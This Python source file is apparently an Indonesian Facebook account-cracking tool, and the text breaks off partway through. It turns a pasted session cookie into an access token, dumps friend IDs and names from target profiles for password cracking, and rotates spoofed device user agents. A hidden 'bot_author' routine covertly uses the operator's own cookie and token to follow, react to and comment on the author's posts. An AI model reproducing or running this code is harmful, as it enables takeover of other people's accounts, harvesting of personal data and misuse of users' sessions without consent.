Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Version   = ''
Denventa  = 1827084332
Postingan = 10217173381366429

###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote

###----------[ SHOW IP ADDRES]---------- ###


###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\033[1;97m" # Jingga
A = "\033[1;97m" # Abu-Abu
x = "\033[1;92m"

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

###----------[ LIST ID ACTIVE ]---------- ###

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36'

###----------[ USER AGENT ]---------- ###
def useragent(isi):
    global pengguna_source_code
    pengguna_source_code = isi
    try:os.mkdir("tool")
    except:pass
    pilih_menu_user_agent()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:tampilan_menu()
    
###----------[ TIME ]---------- ###
id_dev = 345 - 340 + 720 - 723
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))


###----------[ APPEND ]---------- ###
OK = []
CP = []
gabung_sandi = []
tempel_sandi = []

###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Author)    +  Codename
sakira = len(Facebook)  +  Codename
sakura = len(Instagram) +  Codename
sakera = len(Whatsapp)  +  Codename
sakora = len(YouTube)   +  Codename
ip_log = Denventa * id_dev - 3654168663

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('\n   %s[%s•%s] %sID NOT PUBLIC PASET NEW ID %s!%s'%(M,P,M,P,M,P))
    exit()
###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    if ip_log != 1:pass
                    else:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)
        
###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)

###----------[ LOGO ]---------- ###
def poster():
    print("""\n\x1b[1;90m
   ⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄
   ⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄
   ⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄
   ⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄
   ⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄
   ⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄
   ⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄
   ⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄
   ⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄
   ⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄
   ⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄
   ⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄
   ⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄""")

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Dump
    try:os.mkdir("dump")
    except:pass
    # Make Directory Pass
    try:os.mkdir("tool")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass

###----------[ LOGIN ]---------- ###
def login():
    resik()
    mkdir_data_login()
    poster()
    cookie = str(input('%s[%s+%s] %sTOKEN Cookies %s: %s'%(J,P,J,P,J,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('login/cookie.json','w').write(cookie)
        open('login/token.json','w').write(token)
        tampilan_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ MENU ]---------- ###
def user(nama):
    print(''%())
    print('        %s[%s+%s] %sNAME FACEBOOK %s%s %s!'%(J,P,J,P,J,nama,P))
def tampilan_menu():
    global gabung_sandi, tempel_sandi
    resik()
    gabung_sandi, tempel_sandi = [], []
    try:open('tool/useragent.json','r').read()
    except Exception as ERROR:
        resik()
    poster()
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        language(cookie)
        get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
        jsx = json.loads(get.text)
        nama = jsx["name"]
        user(nama)
        print(''%())
        tampilan_menu = f"""  {J2}[{P2}01{J2}] {P2}NEW DUMP ID FROM A7M4D-1T   \x1b[1;92m[OK-FIX]
  {J2}[{P2}02{J2}] {P2}NEW DUMP ID FROM FRIENDLIST \x1b[1;92m[OK-FIX] 
  {J2}[{P2}00{J2}] {P2}LOGOUT TOOLS"""
        printer(Panel(tampilan_menu,title=f'{J2}[ {P2}\x1b[1;92mMENU {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}\x1b[1;92mCHOES {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
        pilih_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);login()
def pilih_menu():
    global gabung_sandi, tempel_sandi
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']    : gabung_sandi.append(Author);publik();system_login();metode();urut_crack();addpass();crack()
    elif dc in ['2','02','o']: gabung_sandi.append('Elo');teman_teman()
    elif dc in ['0','00','z']:
        resik()
        print('')
        tamp_logout1 = (f'   {P2}Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {B2}- Denventa -')
        tamp_logout2 = f'''{P2}Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :
    {B2}• {P2}Token/Cookies
    {B2}• {P2}File Dump
    {B2}• {P2}File Tools'''
        printer(Panel(tamp_logout1,title=f'{B2}[ {P2}Goodbye {B2}]',width=54,padding=(1,4),style='#00C8FF'))
        print('')
        printer(Panel(tamp_logout2,title=f'{B2}[ {P2}Log Out {B2}]',width=54,padding=(1,4),style='#00C8FF'))
        input('\n               %s[ %sEnter Untuk Log Out %s]'%(B,P,B))
        try:shutil.rmtree('login')
        except:pass
        try:shutil.rmtree('dump')
        except:pass
        exit('\n\n')
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    
###----------[ USER AGENT ]---------- ###
def useragent(isi):
    global pengguna_source_code
    pengguna_source_code = isi
    try:os.mkdir("tool")
    except:pass
    pilih_menu_user_agent()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:scrap_useragent()
    elif dc in ['2','02','b']:pilih_otomatis()
    elif dc in ['3','03','c']:manual_user_agent()
    elif dc in ['4','04','d']:ua_device_ini()
    elif dc in ['5','05','e']:cek_user_agent()
    elif dc in ['0','00','z']:tampilan_menu()
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_menu_user_agent():
    tampilan_menu_user_agent = f'''  {J2}[{A2}01{J2}] {P2}Scrap UA Browser    {J2}[{A2}04{J2}] {P2}Cari UA HP Ini
  {J2}[{A2}02{J2}] {P2}Ganti UA Otomatis   {J2}[{A2}05{J2}] {P2}Cek UA Digunakan
  {J2}[{A2}03{J2}] {P2}Ganti UA Manual     {J2}[{A2}00{J2}] {P2}Kembali'''
    printer(Panel(tampilan_menu_user_agent,title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def pilih_device():
    tampilan_device = f'''   {J2}[{A2}01{J2}] {P2}Samsung    {J2}[{A2}05{J2}] {P2}Vivo      {J2}[{A2}09{J2}] {P2}Huawei
   {J2}[{A2}02{J2}] {P2}Nokia      {J2}[{A2}06{J2}] {P2}Iphone    {J2}[{A2}10{J2}] {P2}Windows
   {J2}[{A2}03{J2}] {P2}Xiaomi     {J2}[{A2}07{J2}] {P2}Asus      {J2}[{A2}11{J2}] {P2}Chrome
   {J2}[{A2}04{J2}] {P2}Oppo       {J2}[{A2}08{J2}] {P2}Lenovo    {J2}[{A2}12{J2}] {P2}FB'''
    printer(Panel(tampilan_device,title=f'{J2}[ {P2}Device {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def scrap_useragent():
    data_ua = {}
    pt = 0
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:     type = 'software_name/samsung-browser'
    elif dc in ['2','02','b']:   type = 'software_name/nokia-browser'
    elif dc in ['3','03','c']:   type = 'operating_platform_string/xiaomi-mi-a1'
    elif dc in ['4','04','d']:   type = 'operating_platform_string/oppo-f1s-a1601'
    elif dc in ['5','05','e']:   type = 'operating_platform_string/vivo'
    elif dc in ['6','06','f']:   type = 'operating_platform_string/apple'
    elif dc in ['7','07','g']:   type = 'operating_platform_string/asus'
    elif dc in ['8','08','h']:   type = 'operating_platform_string/lenovo'
    elif dc in ['9','09','i']:   type = 'operating_platform_string/huawei'
    elif dc in ['10','010','j']: type = 'operating_system_name/windows'
    elif dc in ['11','011','k']: type = 'operating_system_name/chrome-os'
    elif dc in ['12','012','l']: type = 'software_name/facebook-app'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    url = 'https://developers.whatismybrowser.com/useragents/explore/' + type
    with requests.Session() as xyz:
        req = xyz.get(url)
        pra = par(req.content,'html.parser')
        li = re.findall('<td><a class=\".*?\" href=\".*?\">(.*?)</a></td>',str(pra))
        for y in li:
            try:
                x = f'{A2}'+y
                pt += 1
                pu = str(pt)
                data_ua.update({pu:x.replace('[#AAAAAA]','')})
                printer(Panel(x,title=f'{J2}[{P2}{pu}{J2}]',width=54,title_align='left',style='#FF8F00'))
                time.sleep(2)
            except KeyboardInterrupt:break
    ch = int(input('   %s└──> %s'%(A,J)))
    try:
        open('tool/useragent.json','w').write(data_ua[str(ch)])
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_otomatis():
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['0','00','z']:     open('tool/useragent.json','w').write(ua_default)
    elif dc in ['1','01','a']:   open('tool/useragent.json','w').write(ua_samsung)
    elif dc in ['2','02','b']:   open('tool/useragent.json','w').write(ua_nokia)
    elif dc in ['3','03','c']:   open('tool/useragent.json','w').write(ua_xiaomi)
    elif dc in ['4','04','d']:   open('tool/useragent.json','w').write(ua_oppo)
    elif dc in ['5','05','e']:   open('tool/useragent.json','w').write(ua_vivo)
    elif dc in ['6','06','f']:   open('tool/useragent.json','w').write(ua_iphone)
    elif dc in ['7','07','g']:   open('tool/useragent.json','w').write(ua_asus)
    elif dc in ['8','08','h']:   open('tool/useragent.json','w').write(ua_lenovo)
    elif dc in ['9','09','i']:   open('tool/useragent.json','w').write(ua_huawei)
    elif dc in ['10','010','j']: open('tool/useragent.json','w').write(ua_windows)
    elif dc in ['11','011','k']: open('tool/useragent.json','w').write(ua_chrome)
    elif dc in ['12','012','l']: open('tool/useragent.json','w').write(ua_fb)
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    try:
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def manual_user_agent():
    usera = input('       %s[%s•%s] %sMasukkan User Agent :\n%s'%(J,P,J,P,J))
    if usera in ['',' ','  ','   ']:print('\n       %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));manual_user_agent()
    else:open('tool/useragent.json','w').write(usera);cek_user_agent()
def ua_device_ini():
    url = 'https://www.google.com/search?q=my+user+agent'
    try:
        if "linux" in sys.platform.lower():chrome_path = '/usr/bin/google-chrome %s';webbrowser.get(chrome_path).open(url)
        elif "win" in sys.platform.lower():chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s';webbrowser.get(chrome_path).open(url)
        else:chrome_path = 'open -a /Applications/Google\ Chrome.app %s';webbrowser.get(chrome_path).open(url)
        manual_user_agent()
    except Exception as e:print('\n   %s[%s•%s] %sTidak Dapat Menemukan Useragent %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);tampilan_menu()
def cek_user_agent():
    try:
        usera = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{usera}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Saat Ini {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        input('\n   %s[ %sKembali %s]'%(J,P,J))
        tampilan_menu()
    except Exception as e:kecuali(e)

###----------[ DUMP ID PUBLIC ]---------- ###
def publik():
    global file_dump
    try:
        try:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
        except:
            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
            time.sleep(3)
            login()
        print('       %s[%s•%s] %sREDME : COPYE LINK FACEBOOK CONVERT IN ID PASTE HERE '%(J,P,J,P))
        tid = input('       %s[%s•%s] %sTARGET ID FACEBOOK : %s'%(J,P,J,P,J)).split(',')
        file_dump = 'dump/%s.json'%(tid[0])
        try:os.remove(file_dump)
        except:pass
        for id in tid :
            try:
                url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
                with requests.Session() as xyz:
                    jso = json.loads(xyz.get(url,cookies=cookie).text)
                    if len(gabung_sandi) != 1:
                        for x in range(Postingan):
                            open(file_dump,'a+').write('dev\n')
                    else:
                        for d in jso["friends"]["data"]:
                            try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
                            except:continue
            except Exception as e:kecuali(e)
        jum = open(file_dump,'r').read().splitlines()
        print('       %s[%s•%s] %sSUCCESSFULLY DUMP %s%s %sID'%(J,P,J,P,J,str(len(jum)),P))
        print('       %s[%s•%s] %sFILE NAME : %s%s %s'%(J,P,J,P,J,file_dump,P))
    except Exception as e:kecuali(e)

###----------[ DUMP ID FRIENDLIST FROM FRIENDLIST ]---------- ###
class teman_teman:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:
            cook    = open('login/cookie.json','r').read()
            cookie  = {'cookie':cook}
